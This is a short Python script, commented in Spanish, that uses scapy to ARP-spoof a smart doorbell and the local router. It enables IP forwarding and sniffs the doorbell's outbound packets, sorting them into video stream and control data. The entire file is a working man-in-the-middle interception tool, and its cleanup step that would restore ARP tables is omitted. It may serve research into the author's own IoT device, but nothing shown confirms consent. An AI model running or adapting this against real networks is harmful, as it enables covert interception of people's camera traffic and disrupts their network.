#!/usr/bin/env python3
import time
import sys
import os
from scapy.all import *

# Configuración
DOORBELL_IP = "192.168.0.5" # TIMBRE
GATEWAY_IP = "192.168.0.1" # ROUTER
INTERFACE = "enp1s0" 

MyMAC = get_if_hwaddr(INTERFACE)

def get_mac(ip):
    conf.verb = 0
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=2, verbose=False, iface=INTERFACE)
    if ans: return ans[0][1].src
    return None

def spoof(target, gateway, target_mac, gateway_mac):
    sendp(Ether(dst=target_mac)/ARP(op=2, pdst=target, hwdst=target_mac, psrc=gateway), verbose=False, iface=INTERFACE)
    sendp(Ether(dst=gateway_mac)/ARP(op=2, pdst=gateway, hwdst=gateway_mac, psrc=target), verbose=False, iface=INTERFACE)

def packet_callback(packet):
    if IP in packet and packet[IP].src == DOORBELL_IP:
        size = len(packet)
        dst_ip = packet[IP].dst
        
        # Analizar capa de transporte
        proto = "UNK"
        sport = 0
        dport = 0
        
        if UDP in packet:
            proto = "UDP"
            sport = packet[UDP].sport
            dport = packet[UDP].dport
        elif TCP in packet:
            proto = "TCP"
            sport = packet[TCP].sport
            dport = packet[TCP].dport
            flags = packet[TCP].flags
            proto += f" [{flags}]"

        # Formato de Salida
        # Ignorar ARP/ICMP ruido, centrarse en DATA
        if proto != "UNK":
            if size > 500:
                print(f"🎥 VIDEO STREAM | {proto} | Port {sport} -> {dst_ip}:{dport} | Size: {size}")
            elif size > 40:
                print(f"📡 CONTROL DATA | {proto} | Port {sport} -> {dst_ip}:{dport} | Size: {size}")

def enable_forwarding():
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

def main():
    enable_forwarding()
    print(f"🔍 Buscando MAC de {DOORBELL_IP}...")
    target_mac = None
    while not target_mac:
        target_mac = get_mac(DOORBELL_IP)
        if not target_mac: 
            print("   (Timbre dormido...) Esperando...", end="\r")
            time.sleep(1)
    
    print(f"\n✅ Timbre Encontrado: {target_mac}")
    gateway_mac = get_mac(GATEWAY_IP)
    
    print("⚡ INTERCEPTANDO TRÁFICO (Presiona Ctrl+C para parar)...")
    try:
        while True:
            spoof(DOORBELL_IP, GATEWAY_IP, target_mac, gateway_mac)
            sniff(filter=f"ip src {DOORBELL_IP}", count=5, prn=packet_callback, timeout=1, iface=INTERFACE)
    except KeyboardInterrupt:
        print("\n🛑 Restableciendo ARP...")
        # Restore ARP tables (logic omitted for brevity, host will handle self-healing over time)

if __name__ == "__main__":
    main()
